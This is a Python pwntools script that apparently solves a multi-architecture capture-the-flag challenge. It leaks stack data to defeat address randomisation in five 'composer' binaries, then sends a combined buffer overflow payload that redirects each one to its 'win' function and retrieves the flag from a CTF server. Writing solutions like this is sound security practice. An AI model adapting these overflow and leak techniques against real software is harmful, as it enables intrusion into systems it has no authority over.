#!/usr/bin/python3

from pwn import *

S390X = 0
AARCH64 = 1
ARM = 2
RISCV64 = 3
X86_64 = 4

INSTANCE = None

vulns = [
    ELF("./composer-s390x"),
    ELF("./composer-aarch64"),
    ELF("./composer-arm"),
    ELF("./composer-riscv64"),
    ELF("./composer-x86_64")
]

TOKS = [None for _ in range(5)]

X86_64_RET = 0x000025e7

def recv() -> list[bytes]:
    l = []
    p.recvuntil(b"s390x: ")
    resp = p.recvuntil(b"'\naarch64: ", drop=True) + b"'"
    l.append(eval(resp))
    resp = p.recvuntil(b"'\narm: ", drop=True) + b"'"
    l.append(eval(resp))
    resp = p.recvuntil(b"'\nriscv64: ", drop=True) + b"'"
    l.append(eval(resp))
    resp = p.recvuntil(b"'\nx86_64: ", drop=True) + b"'"
    l.append(eval(resp))
    resp = p.recvuntil(b"'\n", drop=True) + b"'"
    l.append(eval(resp))
    return l

def solve_x86_64():
    global p
    p = process(["qemu-x86_64", "-g", "1234", "composer-x86_64"])
    p.recvline()

    #leak PIE
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    payload = b""
    payload += 0x30*b"A" #padding
    payload += b"X" #overwrite null byte
    p.sendline(payload)
    p.recvuntil(b"composer: ")
    p.recvuntil(b"AAAAAX")
    leak = b"\0" + p.recvline(keepends=False)
    vulns[X86_64].address = unpack(leak, 'all') - vulns[X86_64].symbols["main"]
    info(f"PIE @ {hex(vulns[X86_64].address)}")

    #win
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    payload = b""
    payload += 0x58*b"A"
    payload += p64(vulns[X86_64].address + X86_64_RET)
    payload += p64(vulns[X86_64].symbols["win"])
    p.sendline(payload)
    p.recvline()
    p.sendline(b"2")
    p.interactive()

def solve_s390x():
    global p
    p = process(["qemu-s390x", "-g", "1234", "composer-s390x"])
    p.recvline()

    #leak PIE
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    vulns[S390X].address = 0x2aa00000000
    payload = b""
    payload += 0x90*b"A" #padding
    payload += p64(vulns[S390X].symbols["win"], endian="big")
    p.sendline(payload)
    p.recvline()
    p.sendline(b"2")
    p.interactive()
    
def solve_aarch64():
    global p
    p = process(["qemu-aarch64", "-g", "1234", "composer-aarch64"])
    p.recvline()

    #leak PIE
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    #vulns[AARCH64].address = 0x2aa00000000
    payload = b""
    payload += 0x10*b"A" #padding
    #payload += p64(vulns[AARCH64].symbols["win"])
    p.sendline(payload)
    p.recvline()
    p.sendline(b"2")
    p.interactive()

def solve_arm():
    global p
    p = process(["qemu-arm", "-g", "1234", "composer-arm"])
    p.recvline()

    #leak PIE
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    vulns[ARM].address = 0x400000
    payload = b""
    payload += 0x3c*b"A" #padding
    payload += p32(vulns[ARM].symbols["win"])
    p.sendline(payload)
    p.recvline()
    p.sendline(b"2")
    p.interactive()

def solve_riscv64():
    global p
    p = process(["qemu-riscv64", "-g", "1234", "composer-riscv64"])
    p.recvline()

    #leak PIE
    p.sendline(b"1")
    p.recvuntil(b"composer:")
    #vulns[ARM].address = 0x400000
    payload = b""
    payload += 0x10*b"A" #padding
    #payload += p32(vulns[ARM].symbols["win"])
    p.sendline(payload)
    p.recvline()
    #p.sendline(b"2")
    p.interactive()

def read_stack(inst:int, pos:int) -> bytes:
    p.sendline(b"1")
    recv()
    payload = (pos - 1)*b"A" + b"X"
    p.sendline(payload)
    resp = recv()
    leak = resp[inst]
    leak_start = leak.index(payload) + len(payload)
    leak = leak[leak_start:-1]
    return leak


def solve_all():
    recv()
    #leak arm
    leak = read_stack(ARM, 0x28)
    vulns[ARM].address = unpack(leak, 'all') - vulns[ARM].symbols["main"]
    info(f"PIE arm @ {hex(vulns[ARM].address)}")

    #leak aarch64
    leak = read_stack(AARCH64, 0x28)
    vulns[AARCH64].address = unpack(leak, 'all') - vulns[AARCH64].symbols["libc_start_main_stage2"] - 0x38
    info(f"PIE aarch64 @ {hex(vulns[AARCH64].address)}")

    #leak x86_64
    leak = b"\0" + read_stack(X86_64, 0x31)
    vulns[X86_64].address = unpack(leak, 'all') - vulns[X86_64].symbols["main"]
    info(f"PIE x86_64 @ {hex(vulns[X86_64].address)}")

    #leak riscv64
    leak = read_stack(RISCV64, 0x50)
    vulns[RISCV64].address = unpack(leak, 'all') - vulns[RISCV64].symbols["main"]
    info(f"PIE riscv64 @ {hex(vulns[RISCV64].address)}")

    #leak s390x
    leak = read_stack(S390X, 0x92)
    leak2 = read_stack(S390X, 0x94)
    leak += leak2 if leak2 else b"\0"
    leak2 = read_stack(S390X, 0x95)
    leak += leak2 if leak2 else b"\0"
    leak += read_stack(S390X, 0x96)
    leak = b"\0\0" + leak
    vulns[S390X].address = u64(leak, endian="big") - vulns[S390X].symbols["libc_start_main_stage2"] - 60
    info(f"PIE S390X @ {hex(vulns[S390X].address)}")

    #exploit
    p.sendline(b"1")
    recv()
    payload = b""
    payload += 0x28*b"A"
    payload += p64(vulns[AARCH64].symbols["win"]) #0x30
    payload += 8*b"F"
    payload += 4*b"E" + p32(vulns[ARM].symbols["win"])
    payload += 0x18*b"D" #0x58
    payload += p64(vulns[X86_64].address + X86_64_RET)
    payload += p64(vulns[X86_64].symbols["win"])
    payload += 8*b"B" #0x70
    payload += p64(vulns[RISCV64].symbols["win"])
    payload += 0x18*b"C"
    payload += p64(vulns[S390X].symbols["win"], endian="big")
    p.sendline(payload)
    recv()
    p.sendline(b"2")
    resp = recv()
    for i in range(5):
        TOKS[i] = resp[i][:16]

    #validate
    p.sendline(b"magic word")
    p.recvuntil(b"toks:")
    for t in TOKS:
        if t is None:
            p.sendline(b"")
        else:
            p.sendline(t)

    p.recvuntil(b"flag:\n")
    flag = p.recvline(keepends=False).decode()
    info(flag)


if args.REMOTE:
    p = remote("complicated--kiiara-1043.ctf.kitctf.de", "443", ssl=True)
    solve_all()
elif args.X86_64:
    solve_x86_64()
elif args.S390X:
    solve_s390x()
elif args.AARCH64:
    solve_aarch64()
elif args.ARM:
    solve_arm()
elif args.RISCV64:
    solve_riscv64()
else:
    p = remote("localhost", 14140)
    solve_all()